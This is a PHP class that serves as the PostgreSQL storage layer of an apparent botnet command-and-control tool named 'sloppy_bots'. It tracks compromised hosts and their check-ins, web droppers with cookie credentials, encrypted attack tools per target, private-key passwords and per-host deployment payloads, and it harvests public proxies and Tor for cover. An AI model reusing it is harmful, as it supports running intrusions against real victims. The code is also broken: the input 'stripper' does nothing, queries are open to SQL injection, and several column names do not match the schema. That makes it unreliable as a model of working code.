<?php
const allowed_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
class postgres_pdo extends PDO
{
    function __construct($dsn, $username = null, $password = null, $options = null)
    {
        parent::__construct($dsn, $username, $password, $options);
    }

    function __destruct()
    {
        // TODO: Implement __destruct() method.
        // there is no close method. no need for destruct.
        $this->commit();
    }
    public function firstRun(){
        $this->createDB();
        $this->getProxies('initial');
        return true;
    }
    public function beginTransaction()
    {
        parent::beginTransaction(); // TODO: Change the autogenerated stub
    }
    public function commit()
    {
        parent::commit(); // TODO: Change the autogenerated stub
    }
    private function stripper(string $s): string
    {
        preg_replace('/[\']|[\"]|[\\x]|[\%]|[0x]|[select]|[drop]|[sqlite_ma]|[update]|[and]|[or]|[wher]|[functio]|[--]|[\/\/]|[unio]|[\\u]|[#]|[\s]|[\b]|[\cY]|[[:punct:]]|[[:xdigit:]]|[[:graph:]]|[[:cntrl:]]|[[:blank:]]/gmi', '', $s);
        return $s;
    }
    function insertData(array $data)
    {
        switch ($data['action']) {
            case strpos($data['action'], "add_bot") !== false:
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in) VALUES ('%s', '%s', '%s', '%s', '%s');",
                        $this->quote($this->stripper($data['rhost'])),
                        $this->quote($this->stripper($data['uri'])),
                        $this->quote($this->stripper($data['uuid'])),
                        $this->quote($this->stripper($data['os_flavor'])),
                        $this->quote($this->stripper($data['check_in'])) ?? 1
                    ));
                    return true;
                } catch (PDOException $e) {
                    print("Insert main table Error: " . $this->lastErrorMsg() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            case strpos($data['action'], "add_dropper") !== false:
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, caller_domain, cookiename, cookievalue, user_agent) VALUES('%s', '%s', '%s', '%s', '%s');",
                        $data['location_on_disk'],
                        $data['caller_domain'],
                        $data['cookiename'],
                        $data['cookievalue'],
                        $data['user_agent']
                    ));
                    return true;
                } catch (PDOException $e) {
                    print("Insert dropper Error: " . $this->lastErrorMsg() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            case strpos($data['action'], 'add_cert') !== false:
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES ('%s','%s','%s','%s','%s','%s','%s','%s');",
                        $data['cert_location'],
                        $data['base64_data'],
                        $data['csr'],
                        $data['pub'],
                        $data['pem'],
                        $data['cipher'],
                        $data['is_encrypted'],
                        $data['priv_key_pass']
                    ));
                    return true;
                } catch (PDOException $e) {
                    print("Insert certificate error: " . $this->lastErrorMsg() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            case strpos($data['action'], "proxies") !== false:
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES('%s', '%s');",
                        $data['proxy_schema'],
                        $data['proxy']
                    ));
                    return true;
                } catch (PDOException $e) {
                    print("Insert proxy error: " . $this->lastErrorMsg() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            case strpos($data['action'], "add_tool_encrypted") !== false:
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES('%s','%s','%s','%s','%s','%s','%s','%s','%s','%s');",
                        $data['tool_name'],
                        $data['target'],
                        $data['base64_data'],
                        $data['key'],
                        $data['tag'],
                        $data['iv'],
                        $data['cipher'],
                        $data['hmac_hash'],
                        $data['lang'],
                        $data['is_encrypted']
                    ));
                    return true;
                } catch (PDOException $e) {
                    print("Insert encrypted tool error: " . $this->lastErrorMsg() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            case strpos($data['action'], "add_tool") !== false:
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES('%s','%s','%s','%s', '%s');",
                        $data['tool_name'],
                        $data['target'],
                        $data['base64_data'],
                        $data['lang'],
                        $data['is_encrypted']
                    ));
                    return true;
                } catch (PDOException $e) {
                    print("Insert tool error: " . $this->lastErrorMsg() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            case strpos($data['action'], "add_domain") !== false:
                try {
                    $this->exec(sprintf("INSERT INTO sloppy_bots_domains(from_domain) VALUES('%s');",
                        $data['domain_name']
                    ));
                    return true;
                } catch (PDOException $e) {
                    print("Insert domain error: " . $this->lastErrorMsg() . PHP_EOL);
                    $this->rollBack();
                    return false;
                }
            default:
                print("Action was empty, cannot handle this.");
                return false;
        }
    }
    public function grabAndFormatOutput(array $data): mixed{
        switch ($data['type']) {
            case strpos($data['type'], "proxy") !== false:
                if (isset($data['schema'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = '%s' LIMIT %s", $data['schema'], $data['limit']);
                }else{
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy = '%s'", $data['proxy_ip']);
                }
                break;
            case strpos($data['type'], "dropper") !== false:
                $sqlfrag = "SELECT * FROM sloppy_bots_slim_droppers";
                break;
            case strpos($data['type'], "tools") !== false:
                if (isset($data['target'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE target = '%s'", $data['target']);
                }elseif (isset($data['lang'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE lang = '%s'", $data['lang']);
                }elseif (isset($data['is_encrypted'])){
                    $sqlfrag = sprintf("SELECT * FROM sloppy_bots_tools WHERE is_encrypted = '%s'", $data['is_encrypted']);
                }else{
                    $sqlfrag = "SELECT * FROM sloppy_bots_tools";
                }
                break;
            case strpos($data['type'], 'pullSlop') !== false:
                $sqlfrag = sprintf("SELECT encrypted_contents, pem_used FROM sloppy_deployer WHERE targeted_host = '%s'", $data['rhost']);
                break;
            default:
                break;
        }
        if (isset($sqlfrag)) {
            return $this->query($sqlfrag);
        }else{
            return null;
        }
    }
    private function getProxies(string $doAction){
        $dx = curl_init();
        $proxy_types = array(
            "http",
            "socks4",
            "socks5"
        );
        if ($doAction === "initial") {
            $outWrite = file(getcwd() . "/includes/config/sloppy_config.ini");
            $tt = fopen(getcwd() . '/includes/config/sloppy_config.ini', "w");
            $outWrite[10] = "proxy_init=true\n";
            foreach ($outWrite as $val) {
                fwrite($tt, $val);
            }
            fclose($tt);
            try {
                $this->exec(sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES ('%s', '%s')", 'tor', '127.0.0.1:9050'));
            }catch (PDOException $e){
                print("It appears as though there was an error building the proxy table: ". $e->getMessage().PHP_EOL);
            }
            foreach ($proxy_types as $prox) {
                curl_setopt($dx, CURLOPT_URL, "https://api.proxyscrape.com/?request=getproxies&proxytype={$prox}&timeout=10000&country=all&ssl=all&anonymity=all");
                curl_setopt($dx, CURLOPT_TIMEOUT, 15);
                curl_setopt($dx, CURLOPT_CONNECTTIMEOUT, 15);
                curl_setopt($dx, CURLOPT_RETURNTRANSFER, true);
                $rt_pr = curl_exec($dx);
                if (!curl_errno($dx)) {
                    switch (curl_getinfo($dx, CURLINFO_HTTP_CODE)) {
                        case 200:
                            unlink($prox);
                            file_put_contents($prox, $rt_pr);
                            foreach (file($prox) as $prValue) {
                                try {
                                    $this->exec(sprintf("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES ('%s', '%s')",
                                        $prox,
                                        trim($prValue),
                                    ));
                                }catch (PDOException $e){
                                    print("Insert proxy Error:" . $e->getMessage().PHP_EOL);
                                }
                            }
                            break;
                        default:
                            echo "Appears as though the server has blocked us." . PHP_EOL;
                            break;
                    }
                }
            }
        }else{
            echo "Still building.".PHP_EOL;
        }
        curl_close($dx);
    }
    private function createDB(): bool
    {
        $sloppy_ini = parse_ini_file(getcwd() . "/includes/config/sloppy_config.ini", true);
        if (empty($sloppy_ini['sloppy_db']['pass'])) {
            try {
                $outWrite = file(getcwd() . "/includes/config/sloppy_config.ini");
                $tt = fopen(getcwd() . '/includes/config/sloppy_config.ini', "w");
                $p = substr(str_shuffle(allowed_chars), 0, rand(8, 15));
                $outWrite[2] = "pass={$p}\n";
                foreach ($outWrite as $val) {
                    fwrite($tt, $val);
                }
                fclose($tt);
                echo "Please annotate this down somewhere. This will be the sloppy_bot password: " . $p . "\n";
                $this->exec( sprintf("CREATE ROLE sloppy_bot WITH LOGIN ENCRYPTED PASSWORD '%s'", $p));
                $this->exec( sprintf("GRANT ALL ON ALL TABLES IN SCHEMA public TO %s", get_current_user()));
                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-')");
                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_slim_droppers(id SERIAL NOT NULL constraint sloppy_bots_slim_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, caller_domain TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', cookievalue TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT '-')");
                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0, domain TEXT UNIQUE NOT NULL DEFAULT '-')");
                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id SERIAL NOT NULL constraint sloppy_bots_tools_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, tool_name TEXT UNIQUE NOT NULL DEFAULT '-', target TEXT NOT NULL DEFAULT '-', base64_encoded_tool TEXT UNIQUE NOT NULL DEFAULT '-', keys TEXT UNIQUE DEFAULT '-', tags TEXT UNIQUE DEFAULT '-', iv TEXT UNIQUE DEFAULT '-', aad TEXT DEFAULT '-',cipher TEXT DEFAULT '-', hmac_hash TEXT UNIQUE DEFAULT '-', lang TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false)");
                $this->exec( "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id SERIAL NOT NULL constraint sloppy_bots_certs_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, cert_location_on_disk TEXT UNIQUE NOT NULL DEFAULT '-', base64_encoded_cert TEXT UNIQUE NOT NULL DEFAULT '-', csr TEXT UNIQUE DEFAULT '-', pub TEXT UNIQUE DEFAULT '-', pem TEXT UNIQUE DEFAULT '-', cipher TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false, priv_key_password TEXT NOT NULL DEFAULT '-' UNIQUE)");
                $this->exec("CREATE TABLE IF NOT EXISTS sloppy_bots_proxies(id SERIAL NOT NULL constraint sloppy_bots_proxies_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, proxy_schema TEXT NOT NULL DEFAULT '-', proxy TEXT UNIQUE NOT NULL DEFAULT '-', times_used INTEGER NOT NULL DEFAULT 0, last_domain_contacted TEXT NOT NULL DEFAULT '-', proxy_still_viable BOOLEAN NOT NULL DEFAULT TRUE, round_trip_time INTEGER NOT NULL DEFAULT 0, time_outs INTEGER NOT NULL DEFAULT 0, successful_responses INTEGER NOT NULL DEFAULT 0)");
                $this->exec("CREATE TABLE IF NOT EXISTS sloppy_deployer(id SERIAL NOT NULL constraint sloppy_deployer_pkey,encrypted_contents TEXT NOT NULL,pem_used TEXT NOT NULL DEFAULT 'NONE',targeted_host TEXT NOT NULL, targeted_host TEXT NOT NULL)");
                $this->exec("GRANT SELECT,INSERT,UPDATE ON sloppy_bots_main,sloppy_bots_certs,sloppy_bots_domains,sloppy_bots_tools,sloppy_bots_proxies,sloppy_bots_slim_droppers TO sloppy_bot");
                $this->exec("GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO sloppy_bot");
                // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
                $this->commit();
                return true;
            } catch (Exception $ex) {
                $this->rollBack();
                echo $ex->getMessage() . "\n";
                echo $ex->getLine() . "\n";
                echo $ex->getTraceAsString() . "\n";
                return false;
            }
        }else{
            return true;
        }
    }
}